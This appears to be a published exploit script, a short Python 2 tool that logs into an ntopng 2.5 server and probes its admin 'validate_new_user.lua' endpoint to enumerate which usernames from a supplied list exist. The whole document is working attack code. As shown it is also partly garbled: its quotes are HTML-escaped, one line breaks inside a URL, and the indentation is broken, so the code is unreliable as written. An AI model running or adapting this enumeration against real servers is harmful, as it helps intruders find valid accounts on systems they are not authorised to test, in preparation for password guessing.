# Author: Dolev Farhi
# Contact: dolevf at protonmail.com
# Date: 04-08-2016
# Vendor homepage: ntop.org
# Software version: v.2.5.160805
 
#!/usr/env/python
import os
import sys
import urllib
import urllib2
import cookielib
 
server = &#039;ip.add.re.ss&#039;
username = &#039;ntopng-user&#039;
password = &#039;ntopng-password&#039;
timeout = 6
 
if len(sys.argv) < 2:
    print("usage: %s <usernames file>") % sys.argv[0]
    sys.exit(1)
 
if not os.path.isfile(sys.argv[1]):
    print("%s doesn&#039;t exist") % sys.argv[1]
    sys.exit(1)
 
try:
    cj = cookielib.CookieJar()
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    login_data = urllib.urlencode({&#039;user&#039; : username, &#039;password&#039; :
password, &#039;referer&#039; : &#039;/authorize.html&#039;})
    opener.open(&#039;http://&#039; + server + &#039;:3000/authorize.html&#039;, login_data,
timeout=timeout)
    print("\nEnumerating ntopng...\n")
    with open(sys.argv[1]) as f:
    for user in f:
        user = user.strip()
        url = &#039;http://%s:3000/lua/admin/validate_new_user.lua?user=%s&netw
orks=0.0.0.0/0,::/0&#039; % (server, user)
          resp = opener.open(url)
        if "existing" not in resp.read():
            print "[NOT FOUND] %s" % user
        else:
            print "[FOUND] %s" % user
except Exception as e:
    print e
    sys.exit(1)

